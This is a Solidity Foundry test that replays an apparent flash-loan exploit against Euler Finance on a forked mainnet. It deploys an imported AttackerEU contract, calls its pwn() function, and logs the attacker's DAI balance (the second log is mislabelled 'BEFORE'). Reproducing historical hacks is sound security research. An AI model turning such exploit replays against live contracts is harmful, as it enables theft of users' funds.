// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "src/FlashLoanAttacks/EUFinance/AttackerEU.sol";

contract Eu3 is Test {
    address attacker;
    AttackerEU attackerEuContract;
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);

    function setUp() public {
        vm.createSelectFork("mainnet", 16797974);
        attacker = makeAddr("Attacker");
    }

    function testExploit() public {
        console.log(
            "ATACKER DAI BALANCE BEFORE EXPLOIT : %s ",
            DAI.balanceOf(address(attacker))
        );
        vm.startPrank(attacker);
        attackerEuContract = new AttackerEU();
        attackerEuContract.pwn();
        vm.stopPrank();
        console.log(
            "ATACKER DAI BALANCE BEFORE EXPLOIT : %s ",
            DAI.balanceOf(address(attacker))
        );
    }
}
